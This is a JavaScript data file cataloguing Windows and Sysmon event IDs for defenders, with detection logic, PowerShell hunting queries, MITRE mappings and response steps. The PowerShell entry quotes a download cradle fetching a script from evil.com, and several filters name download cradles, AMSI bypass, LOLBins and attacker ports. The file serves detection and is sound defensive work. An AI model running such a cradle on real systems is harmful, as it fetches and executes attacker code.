export const EVENTS = [
  {
    id: "4625",
    name: "Failed Login Attempt",
    category: "Authentication",
    logSource: "Security",
    severity: "High",
    description: "An account failed to log on. Indicates failed authentication attempts.",
    useCase: "Detect brute force attacks, password spraying, or unauthorized access attempts.",
    detectionLogic: "Normal: 1–3 failures occasionally. Suspicious: 5+ failures within 60 seconds from same IP or targeting same account → Brute Force. 50+ failures across many accounts → Password Spray.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get last 50 failed logins
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 |
  Select-Object TimeCreated, Message |
  Format-List

# Detect brute force: >10 failures in last 10 minutes
$since = (Get-Date).AddMinutes(-10)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=$since} |
  Group-Object {$_.Properties[5].Value} |
  Where-Object Count -gt 10 |
  Select-Object Name, Count`,
    exampleScenario: "Attacker runs Hydra or Medusa against RDP/SMB service. System logs hundreds of 4625 events in minutes from a single source IP.",
    mitreId: "T1110",
    mitreName: "Brute Force",
    mitreUrl: "https://attack.mitre.org/techniques/T1110/",
    responseAction: "1. Block source IP at firewall immediately\n2. Lock the targeted account temporarily\n3. Alert Tier 2 analyst\n4. Check for 4624 after the 4625 storms (success after brute force)",
    remediation: "1. Enable Account Lockout Policy (GPO: 5 attempts → 30 min lockout)\n2. Enable MFA on all remote access\n3. Deploy geo-blocking for RDP\n4. Use Fail2Ban equivalent or Azure AD Smart Lockout\n5. Disable NTLM where possible",
    notes: "Check Logon Type field: Type 3 = Network, Type 10 = RemoteInteractive (RDP). Correlate with 4776 (NTLM auth) for lateral movement."
  },
  {
    id: "4624",
    name: "Successful Login",
    category: "Authentication",
    logSource: "Security",
    severity: "Low",
    description: "An account was successfully logged on. Baseline event for all authentication.",
    useCase: "Track user activity, detect off-hours logins, impossible travel, or logins after brute force.",
    detectionLogic: "Normal: Expected logon times/locations. Suspicious: Login at 3 AM, login from new country, login immediately after multiple 4625 events, service account logging interactively.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get successful logins with username and IP
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 100 |
  ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
      Time    = $_.TimeCreated
      User    = $xml.Event.EventData.Data[5].'#text'
      LogonType = $xml.Event.EventData.Data[8].'#text'
      SourceIP  = $xml.Event.EventData.Data[18].'#text'
    }
  } | Format-Table -AutoSize

# Find logins outside business hours (before 7AM or after 7PM)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 500 |
  Where-Object { $_.TimeCreated.Hour -lt 7 -or $_.TimeCreated.Hour -gt 19 } |
  Select-Object TimeCreated, Message`,
    exampleScenario: "After a successful brute force (preceded by many 4625), attacker logs in at 2 AM. Single 4624 with Logon Type 3 from an unusual IP.",
    mitreId: "T1078",
    mitreName: "Valid Accounts",
    mitreUrl: "https://attack.mitre.org/techniques/T1078/",
    responseAction: "1. Correlate with preceding 4625 events\n2. Check Logon Type (3=Network, 10=RDP)\n3. Verify source IP against known assets\n4. If suspicious: force password reset, terminate session",
    remediation: "1. Enable Conditional Access policies\n2. Implement time-based access controls\n3. Use SIEM correlation rules for impossible travel\n4. Enable Azure AD Sign-in Risk policies",
    notes: "Logon Types: 2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 10=RemoteInteractive, 11=CachedInteractive. Most critical: Type 3 and 10."
  },
  {
    id: "4672",
    name: "Special Privileges Assigned",
    category: "Privilege Escalation",
    logSource: "Security",
    severity: "High",
    description: "Special privileges (admin/SeDebugPrivilege etc.) assigned to a new logon session.",
    useCase: "Detect privilege escalation, unauthorized admin access, or service accounts gaining elevated rights.",
    detectionLogic: "Normal: Domain Admin or known service accounts. Suspicious: Non-admin accounts receiving privileges, unusual accounts, or this event without corresponding change request.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Monitor privilege assignments
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4672} -MaxEvents 50 |
  Select-Object TimeCreated,
    @{N='Account';E={$_.Properties[1].Value}},
    @{N='Privileges';E={$_.Properties[4].Value}} |
  Format-Table -AutoSize

# Alert on SeDebugPrivilege (used by malware/mimikatz)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4672} -MaxEvents 200 |
  Where-Object { $_.Message -like "*SeDebugPrivilege*" } |
  Select-Object TimeCreated, Message`,
    exampleScenario: "Mimikatz execution: attacker needs SeDebugPrivilege to dump LSASS. Look for 4672 with SeDebugPrivilege for non-admin accounts followed by suspicious process creation.",
    mitreId: "T1078.002",
    mitreName: "Domain Accounts",
    mitreUrl: "https://attack.mitre.org/techniques/T1078/002/",
    responseAction: "1. Identify which account received privileges\n2. Check if this matches approved change request\n3. If unauthorized: immediately revoke privileges\n4. Investigate what actions were taken with those privileges",
    remediation: "1. Implement Privileged Access Workstations (PAW)\n2. Use Just-In-Time (JIT) access\n3. Enable Privileged Identity Management (PIM)\n4. Audit admin group memberships weekly",
    notes: "Always correlate with 4624 (logon event) and look for subsequent 4688 (process creation) events. SeDebugPrivilege is a major red flag — Mimikatz needs it."
  },
  {
    id: "4720",
    name: "User Account Created",
    category: "Account Management",
    logSource: "Security",
    severity: "Medium",
    description: "A new user account was created in Active Directory or local system.",
    useCase: "Detect unauthorized account creation for persistence, backdoor accounts, or insider threat activity.",
    detectionLogic: "Normal: IT creates accounts during onboarding. Suspicious: Account created outside business hours, by non-IT personnel, with admin privileges, or not in HR ticket system.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get recently created accounts
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} -MaxEvents 20 |
  Select-Object TimeCreated,
    @{N='NewAccount';E={$_.Properties[0].Value}},
    @{N='CreatedBy';E={$_.Properties[4].Value}} |
  Format-Table -AutoSize

# Get all new accounts in last 7 days
$since = (Get-Date).AddDays(-7)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720; StartTime=$since} |
  Select-Object TimeCreated, Message | Format-List`,
    exampleScenario: "After compromising a domain controller, attacker creates 'svc_backup$' account with admin rights at 3 AM. Classic persistence technique.",
    mitreId: "T1136",
    mitreName: "Create Account",
    mitreUrl: "https://attack.mitre.org/techniques/T1136/",
    responseAction: "1. Verify with IT/HR if account creation was authorized\n2. If unauthorized: disable account immediately\n3. Check what the new account accessed (4624 events)\n4. Escalate to IR team",
    remediation: "1. Implement approval workflow for account creation\n2. Alert on 4720 outside business hours\n3. Restrict who can create accounts (least privilege)\n4. Regular account audit/recertification",
    notes: "Always correlate 4720 with 4722 (enabled) and 4728/4732 (added to group). Watch for accounts added to Domain Admins right after creation."
  },
  {
    id: "4726",
    name: "User Account Deleted",
    category: "Account Management",
    logSource: "Security",
    severity: "Medium",
    description: "A user account was deleted from the system or Active Directory.",
    useCase: "Detect evidence tampering, covering tracks, or sabotage. Attackers may delete accounts to hide activity.",
    detectionLogic: "Normal: IT offboarding process. Suspicious: Account deleted outside business hours, high-value account deleted, deleted by non-IT user, or deletion of recently created accounts.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get deleted accounts
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4726} -MaxEvents 20 |
  Select-Object TimeCreated,
    @{N='DeletedAccount';E={$_.Properties[0].Value}},
    @{N='DeletedBy';E={$_.Properties[4].Value}} |
  Format-Table -AutoSize`,
    exampleScenario: "Disgruntled employee deletes service accounts before leaving, causing system outages. Or attacker deletes honeypot/decoy account to test detection capabilities.",
    mitreId: "T1531",
    mitreName: "Account Access Removal",
    mitreUrl: "https://attack.mitre.org/techniques/T1531/",
    responseAction: "1. Identify which account was deleted and by whom\n2. Restore from AD Recycle Bin if needed\n3. Check if deletion was authorized\n4. Review deleted account's recent activity",
    remediation: "1. Enable AD Recycle Bin feature\n2. Restrict delete permissions on accounts\n3. Alert on any admin account deletion\n4. Backup AD state regularly",
    notes: "Enable AD Recycle Bin: Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target (Get-ADForest).Name"
  },
  {
    id: "4688",
    name: "Process Creation",
    category: "Process",
    logSource: "Security",
    severity: "Medium",
    description: "A new process has been created. Critical for detecting malicious code execution.",
    useCase: "Detect malware execution, suspicious child processes, LOLBins abuse, and command-line attacks.",
    detectionLogic: "Normal: Expected applications from standard paths. Suspicious: cmd.exe/powershell.exe spawned by Office apps, processes from temp/AppData, encoded PowerShell, mshta/wscript/cscript running scripts.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Enable Process Creation auditing first (run as admin)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Get process creation events with command lines
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 |
  Select-Object TimeCreated,
    @{N='Process';E={$_.Properties[5].Value}},
    @{N='Parent';E={$_.Properties[13].Value}},
    @{N='CmdLine';E={$_.Properties[8].Value}} |
  Format-Table -AutoSize

# Hunt for PowerShell spawned by Office (suspicious!)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 1000 |
  Where-Object {
    $_.Properties[5].Value -like "*powershell*" -and
    $_.Properties[13].Value -like "*WINWORD*"
  }`,
    exampleScenario: "Malicious Word macro executes: WINWORD.EXE → cmd.exe → powershell.exe -enc [base64]. This parent-child chain is a major red flag.",
    mitreId: "T1059",
    mitreName: "Command and Scripting Interpreter",
    mitreUrl: "https://attack.mitre.org/techniques/T1059/",
    responseAction: "1. Identify parent-child process chain\n2. Check process path (is it from expected directory?)\n3. Examine command line arguments\n4. Kill suspicious process and isolate host",
    remediation: "1. Enable command line logging in Group Policy\n2. Deploy Sysmon for richer process telemetry\n3. Use AppLocker/WDAC to whitelist applications\n4. Block LOLBins with ASR rules in Defender",
    notes: "MUST enable 'Include command line in process creation events' via GPO. Without this, 4688 is much less useful. Consider Sysmon Event ID 1 as a superior alternative."
  },
  {
    id: "5156",
    name: "Network Connection Allowed",
    category: "Network",
    logSource: "Security",
    severity: "Low",
    description: "Windows Filtering Platform allowed a network connection. Maps all outbound/inbound connections.",
    useCase: "Detect C2 beaconing, lateral movement, data exfiltration, and unauthorized network connections.",
    detectionLogic: "Normal: Browser, system updates, known apps. Suspicious: Connections to rare ports (4444, 1337, 8080 from cmd), regular interval connections (beaconing), connections from LOLBins.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "wf.msc",
    powershellCommand: `# Get network connections
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=5156} -MaxEvents 100 |
  Select-Object TimeCreated,
    @{N='App';E={$_.Properties[1].Value}},
    @{N='DestIP';E={$_.Properties[5].Value}},
    @{N='DestPort';E={$_.Properties[6].Value}} |
  Format-Table -AutoSize

# Find connections to suspicious ports
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=5156} -MaxEvents 500 |
  Where-Object {
    $_.Properties[6].Value -in @('4444','1337','8080','9001','31337')
  } | Select-Object TimeCreated, Message`,
    exampleScenario: "Cobalt Strike beacon: regular HTTPS connections every 60 seconds from an unusual process. Check for jitter patterns and unusual destination IPs.",
    mitreId: "T1071",
    mitreName: "Application Layer Protocol",
    mitreUrl: "https://attack.mitre.org/techniques/T1071/",
    responseAction: "1. Block suspicious destination IP at firewall\n2. Identify the process making the connection\n3. Check threat intelligence for the destination IP\n4. Isolate host if C2 suspected",
    remediation: "1. Implement egress filtering\n2. Use DNS sinkholing\n3. Deploy network IDS/IPS\n4. Restrict outbound connections by application (WFAS rules)",
    notes: "5156 generates HIGH volume. Filter by process name to reduce noise. Use Sysmon Event ID 3 for richer network data including DNS names."
  },
  {
    id: "4663",
    name: "File/Object Access",
    category: "File System",
    logSource: "Security",
    severity: "Medium",
    description: "An attempt was made to access a file, key, or other object. Used for DLP and data theft detection.",
    useCase: "Detect unauthorized file access, data exfiltration staging, ransomware file operations.",
    detectionLogic: "Normal: Users accessing their own files. Suspicious: Mass file reads in short time (exfil), access to sensitive directories (SAM, NTDS.dit), unusual process accessing files.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get file access events (must enable Object Access auditing first)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} -MaxEvents 50 |
  Select-Object TimeCreated,
    @{N='File';E={$_.Properties[6].Value}},
    @{N='User';E={$_.Properties[1].Value}},
    @{N='Process';E={$_.Properties[11].Value}} |
  Format-Table -AutoSize

# Detect mass file access (possible ransomware)
$since = (Get-Date).AddMinutes(-5)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663; StartTime=$since} |
  Group-Object {$_.Properties[1].Value} |
  Where-Object Count -gt 100 |
  Select-Object Name, Count`,
    exampleScenario: "Ransomware encrypting files: thousands of 4663 events in minutes as the process reads then writes encrypted versions. Pattern: read → delete → write .locked file.",
    mitreId: "T1005",
    mitreName: "Data from Local System",
    mitreUrl: "https://attack.mitre.org/techniques/T1005/",
    responseAction: "1. Identify the accessing process\n2. If ransomware suspected: IMMEDIATELY isolate from network\n3. Do NOT reboot (may lose forensic evidence)\n4. Engage IR team",
    remediation: "1. Enable SACL auditing on sensitive directories\n2. Use Controlled Folder Access in Windows Defender\n3. Implement file integrity monitoring (FIM)\n4. Regular offline backups",
    notes: "Must configure SACL (System Access Control List) on the specific files/folders you want to audit. Otherwise this event won't fire. Very noisy — target specific high-value paths."
  },
  {
    id: "4104",
    name: "PowerShell Script Block Logging",
    category: "PowerShell",
    logSource: "PowerShell",
    severity: "High",
    description: "Records the full content of PowerShell script blocks as they are executed. Gold standard for PS forensics.",
    useCase: "Detect malicious PowerShell, obfuscated code, download cradles, AMSI bypass attempts.",
    detectionLogic: "Normal: Admin scripts, automation. Suspicious: Base64 encoded commands, Invoke-Expression with encoded content, download cradles (IEX(New-Object Net.WebClient)), AMSI bypass strings.",
    guiPath: "Event Viewer → Applications and Services → Microsoft → Windows → PowerShell → Operational",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Enable Script Block Logging (run as admin)
$path = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
New-Item -Path $path -Force
Set-ItemProperty -Path $path -Name "EnableScriptBlockLogging" -Value 1

# Get PowerShell script block events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object Id -eq 4104 |
  Select-Object TimeCreated,
    @{N='Script';E={$_.Message}} |
  Select-Object -First 20 |
  Format-List

# Hunt for obfuscation/download cradles
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object { $_.Id -eq 4104 -and (
    $_.Message -like "*Invoke-Expression*" -or
    $_.Message -like "*IEX*" -or
    $_.Message -like "*DownloadString*" -or
    $_.Message -like "*EncodedCommand*" -or
    $_.Message -like "*AMSI*"
  )} | Select-Object TimeCreated, Message | Format-List`,
    exampleScenario: "Empire/PowerShell Empire C2: stager runs IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1'). 4104 captures the full decoded script.",
    mitreId: "T1059.001",
    mitreName: "PowerShell",
    mitreUrl: "https://attack.mitre.org/techniques/T1059/001/",
    responseAction: "1. Extract and analyze the full script content\n2. Check URLs/IPs in script against threat intel\n3. Determine if script ran successfully\n4. Scan host for dropped payloads",
    remediation: "1. Enable Constrained Language Mode\n2. Deploy PowerShell v5+ (has better logging)\n3. Enable AMSI (blocks many attacks)\n4. Block unsigned scripts via execution policy + AppLocker",
    notes: "Script Block Logging captures even obfuscated code AFTER deobfuscation. This is extremely powerful for forensics. Enable it via GPO on all systems immediately."
  },
  {
    id: "4103",
    name: "PowerShell Module Logging",
    category: "PowerShell",
    logSource: "PowerShell",
    severity: "Medium",
    description: "Records pipeline execution details for PowerShell modules including inputs and outputs.",
    useCase: "Detect specific PowerShell module usage, track what commands were executed and their output.",
    detectionLogic: "Normal: Admin module usage. Suspicious: Invoke-Mimikatz, PowerView, PowerSploit modules, net module abuse for reconnaissance.",
    guiPath: "Event Viewer → Applications and Services → Microsoft → Windows → PowerShell → Operational",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Enable Module Logging
$path = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging"
New-Item -Path $path -Force
Set-ItemProperty -Path $path -Name "EnableModuleLogging" -Value 1

# Get module logging events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object Id -eq 4103 |
  Select-Object TimeCreated, Message |
  Select-Object -First 20 |
  Format-List`,
    exampleScenario: "BloodHound/SharpHound for AD recon: PowerView module functions like Get-NetUser, Get-NetComputer captured in 4103 events showing full AD enumeration.",
    mitreId: "T1059.001",
    mitreName: "PowerShell",
    mitreUrl: "https://attack.mitre.org/techniques/T1059/001/",
    responseAction: "1. Review which modules were loaded\n2. Check for offensive security tooling (Mimikatz, PowerView)\n3. Correlate with 4104 for full script context\n4. Examine what data was accessed/exfiltrated",
    remediation: "1. Enable both 4103 and 4104 logging\n2. Use PowerShell Just Enough Administration (JEA)\n3. Implement module whitelisting\n4. Monitor for known malicious module names",
    notes: "Module logging (4103) + Script Block logging (4104) + Transcription = full PowerShell visibility. Enable all three via GPO for comprehensive coverage."
  },
  {
    id: "6416",
    name: "USB Device Inserted",
    category: "Device",
    logSource: "Security",
    severity: "Medium",
    description: "A new external device (USB drive, etc.) was recognized by the system.",
    useCase: "Detect unauthorized USB usage, data exfiltration via physical media, BadUSB attacks.",
    detectionLogic: "Normal: Known IT-issued USB devices. Suspicious: Unknown vendor IDs, USB on high-security systems, USB insertion outside business hours, USB on servers.",
    guiPath: "Event Viewer → Windows Logs → Security",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get USB insertion events
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=6416} -MaxEvents 20 |
  Select-Object TimeCreated,
    @{N='DeviceID';E={$_.Properties[1].Value}},
    @{N='Class';E={$_.Properties[6].Value}} |
  Format-Table -AutoSize

# Check USB history in registry
Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\*" |
  Select-Object FriendlyName, @{N='LastConnect';E={$_.Properties}} |
  Format-Table`,
    exampleScenario: "Insider threat: Employee inserts USB drive to copy company database before resigning. Or: Rubber Ducky (BadUSB) inserted to execute keystrokes as keyboard.",
    mitreId: "T1091",
    mitreName: "Replication Through Removable Media",
    mitreUrl: "https://attack.mitre.org/techniques/T1091/",
    responseAction: "1. Identify the device (vendor, serial number)\n2. Check if device is on approved list\n3. Review what files were copied to/from device\n4. Confiscate device if insider threat suspected",
    remediation: "1. Disable USB ports via GPO on sensitive systems\n2. Use endpoint DLP to block unauthorized USB\n3. Whitelist only approved USB devices\n4. Enable BitLocker To Go for encrypted USB only",
    notes: "Also check Event ID 6419 (disable device request) and correlate with 4663 (file access) to see what was copied. USB vendor IDs can be found at usb.ids database."
  },
  {
    id: "6005",
    name: "System Startup",
    category: "System",
    logSource: "System",
    severity: "Low",
    description: "The Event Log service started, indicating system startup.",
    useCase: "Detect unexpected reboots, track system uptime, identify potential ransomware reboots or unauthorized shutdowns.",
    detectionLogic: "Normal: Scheduled maintenance windows. Suspicious: Unexpected reboot at odd hours, reboot following ransomware indicators, multiple reboots in short time.",
    guiPath: "Event Viewer → Windows Logs → System",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get system startup/shutdown history
Get-WinEvent -FilterHashtable @{LogName='System'; Id=6005,6006} |
  Select-Object TimeCreated, Id,
    @{N='Event';E={if($_.Id -eq 6005){'STARTUP'}else{'SHUTDOWN'}}} |
  Sort-Object TimeCreated -Descending |
  Select-Object -First 20 |
  Format-Table

# Calculate uptime periods
Get-WinEvent -FilterHashtable @{LogName='System'; Id=6005,6006} |
  Sort-Object TimeCreated |
  Select-Object TimeCreated, Id | Format-Table`,
    exampleScenario: "Ransomware reboots system into Safe Mode to bypass security tools. Look for unexpected 6006 (shutdown) followed by 6005 (startup) outside maintenance windows.",
    mitreId: "T1529",
    mitreName: "System Shutdown/Reboot",
    mitreUrl: "https://attack.mitre.org/techniques/T1529/",
    responseAction: "1. Check if reboot was scheduled/authorized\n2. Look at events just before shutdown (6006)\n3. Check for ransomware indicators\n4. Review startup items for persistence",
    remediation: "1. Alert on unexpected reboots\n2. Require change management for server reboots\n3. Implement boot monitoring\n4. Check Autoruns after unexpected reboots",
    notes: "Event 6006 = clean shutdown. If you see 6005 without preceding 6006, it may indicate a crash or hard power cycle. Use with Event ID 41 (unexpected shutdown)."
  },
  {
    id: "6006",
    name: "System Shutdown",
    category: "System",
    logSource: "System",
    severity: "Low",
    description: "The Event Log service was stopped, indicating system shutdown or restart.",
    useCase: "Track system availability, detect unauthorized shutdowns, correlate with attack timelines.",
    detectionLogic: "Normal: Planned maintenance. Suspicious: Shutdown outside change window, shutdown followed by mass file modifications, shutdown after security alert.",
    guiPath: "Event Viewer → Windows Logs → System",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get shutdown events with reason
Get-WinEvent -FilterHashtable @{LogName='System'; Id=6006} -MaxEvents 10 |
  Select-Object TimeCreated, Message | Format-List

# Check shutdown reason codes
Get-WinEvent -FilterHashtable @{LogName='System'; Id=1074} -MaxEvents 10 |
  Select-Object TimeCreated, Message | Format-List`,
    exampleScenario: "After dropping ransomware payload, attacker shuts down system to prevent detection. 6006 at 2 AM on a production server is always suspicious.",
    mitreId: "T1529",
    mitreName: "System Shutdown/Reboot",
    mitreUrl: "https://attack.mitre.org/techniques/T1529/",
    responseAction: "1. Verify if shutdown was authorized\n2. Check Event ID 1074 for shutdown reason and user\n3. Review events in the 30 minutes before shutdown\n4. Inspect system upon next startup",
    remediation: "1. Restrict who can shut down servers\n2. Alert on unplanned shutdowns\n3. Implement UPS with monitoring\n4. Use change management for all reboots",
    notes: "Event ID 1074 gives the reason, user, and process that initiated shutdown. Always check both 6006 and 1074 together."
  },
  {
    id: "SYSMON-1",
    name: "Sysmon: Process Create",
    category: "Process",
    logSource: "Sysmon",
    severity: "Medium",
    description: "Sysmon logs every process creation with hash, parent, and full command line. Far richer than 4688.",
    useCase: "Complete process genealogy tracking, hash-based threat hunting, LOLBin detection, malware identification.",
    detectionLogic: "Suspicious hashes (VirusTotal), abnormal parent-child relationships (Office→PowerShell), processes from unusual paths (%TEMP%, %APPDATA%), rare processes.",
    guiPath: "Event Viewer → Applications and Services → Microsoft → Windows → Sysmon → Operational",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get Sysmon process creation events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object Id -eq 1 |
  Select-Object TimeCreated,
    @{N='Image';E={$_.Properties[4].Value}},
    @{N='CmdLine';E={$_.Properties[10].Value}},
    @{N='Hash';E={$_.Properties[17].Value}},
    @{N='ParentImage';E={$_.Properties[20].Value}} |
  Select-Object -First 50 |
  Format-Table -AutoSize

# Hunt for common LOLBin abuse
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 1 -and $_.Properties[4].Value -match "certutil|mshta|wscript|cscript|regsvr32|rundll32"} |
  Select-Object TimeCreated, Message | Format-List`,
    exampleScenario: "Detecting Cobalt Strike: svchost.exe spawned by services.exe with unusual parameters, or mshta.exe connecting to external IP right after process creation.",
    mitreId: "T1059",
    mitreName: "Command and Scripting Interpreter",
    mitreUrl: "https://attack.mitre.org/techniques/T1059/",
    responseAction: "1. Hash-check the process against VirusTotal\n2. Analyze parent-child process chain\n3. Check network connections from that process\n4. Memory dump if malicious process confirmed",
    remediation: "1. Install Sysmon with SwiftOnSecurity config\n2. Forward Sysmon logs to SIEM\n3. Create baseline of normal process hashes\n4. Alert on hash mismatches for system binaries",
    notes: "Install Sysmon: sysmon64.exe -accepteula -i sysmonconfig.xml. Use SwiftOnSecurity's config as baseline: github.com/SwiftOnSecurity/sysmon-config"
  },
  {
    id: "SYSMON-3",
    name: "Sysmon: Network Connection",
    category: "Network",
    logSource: "Sysmon",
    severity: "Medium",
    description: "Sysmon logs network connections with process name, source/destination IP and port, and DNS names.",
    useCase: "Detect C2 communication, lateral movement, data exfiltration with process attribution.",
    detectionLogic: "Normal: Known apps to known services. Suspicious: Unusual process connecting out, connections to known bad IPs, beaconing patterns (regular intervals), DNS over non-standard ports.",
    guiPath: "Event Viewer → Applications and Services → Microsoft → Windows → Sysmon → Operational",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get Sysmon network connections
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object Id -eq 3 |
  Select-Object TimeCreated,
    @{N='Image';E={$_.Properties[4].Value}},
    @{N='DestHost';E={$_.Properties[14].Value}},
    @{N='DestIP';E={$_.Properties[15].Value}},
    @{N='DestPort';E={$_.Properties[16].Value}} |
  Select-Object -First 50 |
  Format-Table -AutoSize

# Find processes making outbound connections to high ports
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 3 -and [int]$_.Properties[16].Value -gt 1024} |
  Group-Object {$_.Properties[4].Value} |
  Sort-Object Count -Descending | Select-Object -First 10`,
    exampleScenario: "Lateral movement: cmd.exe or powershell.exe connecting to internal IP on port 445 (SMB) indicates Pass-the-Hash or lateral movement attempt.",
    mitreId: "T1021",
    mitreName: "Remote Services",
    mitreUrl: "https://attack.mitre.org/techniques/T1021/",
    responseAction: "1. Check destination IP in threat intel\n2. Identify the parent process\n3. Block destination at network level\n4. Investigate source host fully",
    remediation: "1. Implement network segmentation\n2. Use firewall rules to restrict process-level egress\n3. Deploy IDS/IPS signatures\n4. DNS RPZ (Response Policy Zone) for C2 domains",
    notes: "Sysmon 3 is much richer than Security 5156. It includes DNS hostname, not just IP. This is critical for detecting DGA (Domain Generation Algorithm) C2."
  },
  {
    id: "SYSMON-11",
    name: "Sysmon: File Creation",
    category: "File System",
    logSource: "Sysmon",
    severity: "Medium",
    description: "Logs file creation events with the creating process, full path, and hash of created file.",
    useCase: "Detect dropper activity, ransomware file creation, web shells, suspicious script drops.",
    detectionLogic: "Normal: Known apps creating expected files. Suspicious: Executables dropped in TEMP/Downloads, scripts dropped by Office apps, .bat/.ps1 files created by non-admin processes.",
    guiPath: "Event Viewer → Applications and Services → Microsoft → Windows → Sysmon → Operational",
    winRCommand: "eventvwr.msc",
    powershellCommand: `# Get file creation events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object Id -eq 11 |
  Select-Object TimeCreated,
    @{N='Image';E={$_.Properties[4].Value}},
    @{N='TargetFilename';E={$_.Properties[5].Value}} |
  Select-Object -First 50 |
  Format-Table -AutoSize

# Find executables dropped in suspicious locations
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {
    $_.Id -eq 11 -and (
      $_.Properties[5].Value -like "*\\Temp\\*.exe" -or
      $_.Properties[5].Value -like "*\\AppData\\*.exe" -or
      $_.Properties[5].Value -like "*\\Downloads\\*.exe"
    )
  } | Select-Object TimeCreated, Message | Format-List`,
    exampleScenario: "Malicious email attachment: WINWORD.EXE creates payload.exe in %TEMP%, then spawns it. Sysmon 11 captures the file drop, Sysmon 1 captures the execution.",
    mitreId: "T1105",
    mitreName: "Ingress Tool Transfer",
    mitreUrl: "https://attack.mitre.org/techniques/T1105/",
    responseAction: "1. Hash the dropped file immediately\n2. Check hash against VirusTotal\n3. Quarantine the file\n4. Analyze the creating process",
    remediation: "1. Deploy AV/EDR with real-time scanning\n2. Restrict script execution in user-writable paths\n3. Use AppLocker to block execution from Temp\n4. Enable cloud-delivered protection in Defender",
    notes: "Correlate Sysmon 11 (file drop) → Sysmon 1 (execution) → Sysmon 3 (network) for complete attack chain reconstruction. This 3-event sequence = dropper attack."
  }
];

export const CATEGORIES = [...new Set(EVENTS.map(e => e.category))];
export const SOURCES = [...new Set(EVENTS.map(e => e.logSource))];
export const SEVERITIES = ["Critical", "High", "Medium", "Low"];
